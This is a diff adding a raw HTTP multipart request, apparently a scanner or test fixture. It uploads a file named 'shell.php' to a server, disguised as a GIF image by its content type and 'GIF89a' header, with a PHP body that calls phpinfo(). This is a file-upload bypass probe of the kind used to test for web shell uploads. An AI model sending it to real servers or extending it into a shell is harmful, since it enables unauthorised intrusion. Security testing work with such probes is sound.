@@ -1,0 +1,11 @@
+﻿POST / HTTP/1.1
+Host: pv5cl84fwfwuwkuz.neu-nex.fun
+Content-Type: multipart/form-data; boundary=X
+
+--X
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: image/gif
+
+GIF89a<?php phpinfo(); ?>
+--X--
+
